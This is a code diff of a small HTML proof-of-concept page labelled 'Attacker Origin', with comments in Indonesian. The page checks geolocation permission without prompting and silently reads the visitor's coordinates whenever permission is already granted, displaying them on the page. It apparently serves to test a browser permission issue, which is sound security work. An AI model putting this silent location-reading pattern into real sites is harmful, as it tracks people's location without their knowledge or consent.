@@ -10,30 +10,39 @@
 
 <h2>Attacker Origin</h2>
 <p id="origin"></p>
-<p id="status">Checking permission…</p>
+<p id="status">Waiting…</p>
 
 <script>
+const status = document.getElementById('status');
+
 document.getElementById('origin').textContent =
   'Current origin: ' + location.origin;
 
+// Cek permission TANPA memicu dialog
 if (navigator.permissions) {
   navigator.permissions.query({ name: 'geolocation' })
     .then(p => {
-      document.getElementById('status').textContent =
+      status.textContent =
         'Permission state on load: ' + p.state;
 
-      // ⚠️ ONLY read location if already granted
+      // HANYA baca lokasi jika sudah granted
       if (p.state === 'granted') {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            document.getElementById('status').textContent +=
-              '\nGot location: ' +
+            status.textContent +=
+              '\nLocation received:\n' +
               pos.coords.latitude + ', ' +
               pos.coords.longitude;
+          },
+          err => {
+            status.textContent =
+              'Read error: ' + err.message;
           }
         );
       }
     });
+} else {
+  status.textContent = 'Permissions API not available';
 }
 </script>
 
